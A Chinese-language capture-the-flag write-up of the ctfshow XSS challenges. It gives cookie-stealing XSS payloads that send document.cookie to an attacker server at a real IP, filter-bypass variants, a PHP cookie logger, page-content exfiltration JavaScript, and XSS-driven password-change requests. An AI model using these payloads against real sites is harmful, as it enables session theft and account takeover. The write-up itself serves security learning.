---
title: ctfshow web入门(xss)
categories: ctfshow
---
# 前言
js 咱也不会呀。瞎做做题了解个入门吧

---
# 316
首先作为第一题，详细点

先检测最基础的xss：`<script>alert('1')</script>`

![](https://img-blog.csdnimg.cn/20210420170257434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
当我们生成链接时，我们会弹出一个  1：

<!--more-->

![](https://img-blog.csdnimg.cn/20210420170304601.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
刷新一下就会触发xss

此时只要利用来获取admin的cookie就好


利用服务器
```
<script>window.open('http://1.15.66.132/'+document.cookie)</script>
```


`使用 window 对象的 open() 方法可以打开一个新窗口`


查看日志 发现flag

![](https://img-blog.csdnimg.cn/20210420170436892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)


---
# 317
Onload:

页面加载之后立即执行一段 JavaScript：
```
<body onload="load()">
```


过滤了 `<script>`

```
<iframe onload="window.open('http://x.x.x.x /'+document.cookie)"></iframe>
```

什么是iframe

![](https://img-blog.csdnimg.cn/2021042017060266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
#318
```
<svg onload="window.open('http://1.15.66.132/'+document.cookie)">
```

>SVG (Scalable Vector Graphics) 可缩放矢量图，是一种基于XML语法的图像格式。其他图像格式都是基于像素处理的，SVG则是属于对图像的形状描述，所以它本质上是文本文件，体积相对较小，且放大时也不会失真。


---
# 319
```
<body onload="window.open('http://x.x.x/'+document.cookie)">
```

---
# 320-326
过滤 `空格` 用 `/` 绕过
```
<body/onload=document.location='http://x.x.x/cookie.php?cookie='+document.cookie;>

或者 水平制符标绕过:

<body	onload=document.location='http://1.15.66.132/'+document.cookie;>
```

![](https://img-blog.csdnimg.cn/20210420170759243.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# 327 (存储型xss)
无过滤

![](https://img-blog.csdnimg.cn/20210420170907210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

![](https://img-blog.csdnimg.cn/20210420170915234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# 328

先注册一个账号，存储起来，当管理员访问用户管理页面时，会显示用户名，这时就会盗取cookie

我们再修改cookie，刷新页面

注册提交：

![](https://img-blog.csdnimg.cn/20210420171023508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

获取cookie：

![](https://img-blog.csdnimg.cn/20210420171035355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
修改cookie：

![](https://img-blog.csdnimg.cn/2021042017104654.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# 329

从这道题以后，群主设置了把cookie发送给你之前就让它失效了，所以换一个思路获取页面元素
Test.js:
```js
var img = new Image();
img.src = "http://your-domain/cookie.php?q="+document.querySelector('#top > div.layui-container > div    :nth-child(4) > div > div.layui-table-box > div.layui-table-body.layui-table-main').textContent;//问了师傅才知道这个标签是可以通过浏览器找到的，ttttqqqqll
document.body.append(img);
```

cookie.php:
```php
<?php 
$cookie = $_GET['q']; 
$myFile = "cookie.txt"; 
file_put_contents($myFile, $cookie, FILE_APPEND);
?>
```

不知道为啥直接显示出来

![](https://img-blog.csdnimg.cn/20210420171226938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# 330
修改密码处get一个请求

![](https://img-blog.csdnimg.cn/20210420171249266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
Payload:
```
<script>window.open('http://127.0.0.1/api/change.php?p=1234567')</script>
```

使本地管理员修改密码

admin 1234567 登录


---
# 331
变为post请求

![](https://img-blog.csdnimg.cn/20210420171331366.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
javascript如何发送Http请求，发现方式还是挺多的，这里试试用XMLHttpRequest。

```php
var httpRequest = new XMLHttpRequest();//第一步：创建需要的对象
httpRequest.open('POST', 'url', true); //第二步：打开连接
httpRequest.setRequestHeader("Content-type","application/x-www-form-urlencoded");//设置请求头 注：post方式必须设置请求头（在建立连接后设置请求头）
httpRequest.send('name=teswe&ee=ef');//发送请求 将情头体写在send中
/**
 * 获取数据后的处理程序
 */
httpRequest.onreadystatechange = function () {//请求后的回调接口，可将请求成功后要执行的程序写在其中
    if (httpRequest.readyState == 4 && httpRequest.status == 200) {//验证请求是否发送成功
        var json = httpRequest.responseText;//获取到服务端返回的数据
        console.log(json);
    }
};
```

Payload：直接注册
```
<script>var httpRequest = new XMLHttpRequest();httpRequest.open('POST', 'http://127.0.0.1/api/change.php', true);httpRequest.setRequestHeader("Content-type","application/x-www-form-urlencoded");httpRequest.send('p=1234567');</script>
```


---
# 332
这里还是看y4的解法吧

利用逻辑漏洞：
自己给自己转账自己加钱
给admin转-5000，自己加5000

# 333
只能给自己转钱，bp爆破一下

---
# 参考

[[CTFSHOW]XSS入门(佛系记录)](https://y4tacker.blog.csdn.net/article/details/111568030)

[CTFshow-WEB入门-XSS](https://blog.csdn.net/rfrder/article/details/114079028)

[ctfshow XSS专题](https://blog.csdn.net/weixin_43578492/article/details/112128236)
